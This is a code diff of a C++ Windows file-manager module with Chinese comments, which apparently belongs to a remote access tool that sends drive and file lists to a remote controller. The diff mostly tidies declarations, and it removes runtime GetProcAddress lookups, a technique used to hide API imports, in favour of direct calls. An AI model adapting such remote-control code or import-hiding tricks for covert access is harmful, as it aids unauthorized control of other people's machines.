@@ -6,11 +6,13 @@
 #include <tchar.h>
 #include <winnt.h>
 #include <string.h>
-#include "..\\..\\debug.h"
-#include "imagehlp.h"
 #include <shellapi.h>
-
+#include "imagehlp.h"
 #pragma comment(lib,"imagehlp.lib")
+#include <shlwapi.h>
+#pragma comment(lib,"shlwapi.lib")
+
+#include "..//..//debug.h"
 
 typedef struct _FILESIZE
 {
@@ -103,10 +105,7 @@ UINT CMyFileManager::SendDriveList()
 	char	FileSystem[MAX_PATH];
 	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
 
-	typedef BOOL(WINAPI *GETLOGDS)(DWORD nBufferLength, LPSTR lpBuffer);
-	HINSTANCE hdllde = GetModuleHandleW(L"KERNEL32.dll");
-	GETLOGDS myGetLogds = (GETLOGDS)GetProcAddress(hdllde, "GetLogicalDriveStringsA");
-	myGetLogds(sizeof(DriveString), DriveString);
+	GetLogicalDriveStringsA(sizeof(DriveString), DriveString);
 
 	char *pDrive = DriveString;
 
@@ -165,14 +164,10 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	m_nTransferMode = TRANSFER_MODE_NORMAL;
 
 	TCHAR	strPath[MAX_PATH];
-	TCHAR	*pszFileName = NULL;
-	LPBYTE	lpList = NULL;
-	DWORD	dwOffset = 0; // 位移指针
-	int		nLen = 0;
 	DWORD	nBufferSize = 1024 * 10; // 先分配10K的缓冲区
 	WIN32_FIND_DATA	FindFileData;
 
-	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
+	LPBYTE lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
 
 	wsprintf(strPath, _T("%s\\*.*"), lpszDirectory);
 	HANDLE hFile = FindFirstFile(strPath, &FindFileData);
@@ -186,7 +181,7 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	*lpList = TOKEN_FILE_LIST;
 
 	// 1 为数据包头部所占字节,最后赋值
-	dwOffset = 1;
+	DWORD dwOffset = 1;
 	/*
 	文件属性	1
 	文件名		strlen(filename) + 1 ('\0')
@@ -200,14 +195,14 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 			nBufferSize += MAX_PATH * 2;
 			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
 		}
-		pszFileName = FindFileData.cFileName;
+		TCHAR *pszFileName = FindFileData.cFileName;
 		if (lstrcmp(pszFileName, _T(".")) == 0 || lstrcmp(pszFileName, _T("..")) == 0)
 			continue;
 		// 文件属性 1 字节
 		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
 		dwOffset++;
 		// 文件名 lstrlen(pszFileName) + 1 字节
-		nLen = lstrlen(pszFileName) * sizeof(TCHAR);
+		int nLen = lstrlen(pszFileName) * sizeof(TCHAR);
 		memcpy(lpList + dwOffset, pszFileName, nLen);
 		dwOffset += nLen;
 		*(lpList + dwOffset) = 0;
@@ -366,7 +361,7 @@ void CMyFileManager::UploadNext()
 		// 上传下一个
 		it = m_UploadList.begin();
 		SendFileSize((*it).c_str());
-}
+	}
 }
 
 int CMyFileManager::SendToken(BYTE bToken)
@@ -519,7 +514,7 @@ void CMyFileManager::GetFileData()
 
 	//  1字节Token,四字节偏移高四位，四字节偏移低四位
 	BYTE	bToken[9];
-	DWORD	dwCreationDisposition; // 文件打开方式
+	DWORD	dwCreationDisposition = 0; // 文件打开方式
 	memset(bToken, 0, sizeof(bToken));
 	bToken[0] = TOKEN_DATA_CONTINUE;
 
@@ -629,21 +624,9 @@ void CMyFileManager::Rename(LPBYTE lpBuffer)
 	LPCTSTR lpExistingFileName = (TCHAR *)lpBuffer;
 	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
 
-	HINSTANCE kernel32 = GetModuleHandleW(L"Kernel32.dll");
-
-	typedef BOOL(WINAPI *MOVEF)(LPCTSTR, LPCTSTR);
-#ifdef _UNICODE
-	MOVEF  myMoveFile = (MOVEF)GetProcAddress(kernel32, "MoveFileW");
-#else
-	MOVEF  myMoveFile = (MOVEF)GetProcAddress(kernel32, "MoveFileA");
-#endif
-
-	myMoveFile(lpExistingFileName, lpNewFileName);
+	MoveFile(lpExistingFileName, lpNewFileName);
 	SendToken(TOKEN_RENAME_FINISH);
 }
-
-#include <shlwapi.h>
-#pragma comment(lib,"shlwapi.lib")
 
 void CMyFileManager::PackFile(LPBYTE lpBuffer)
 {
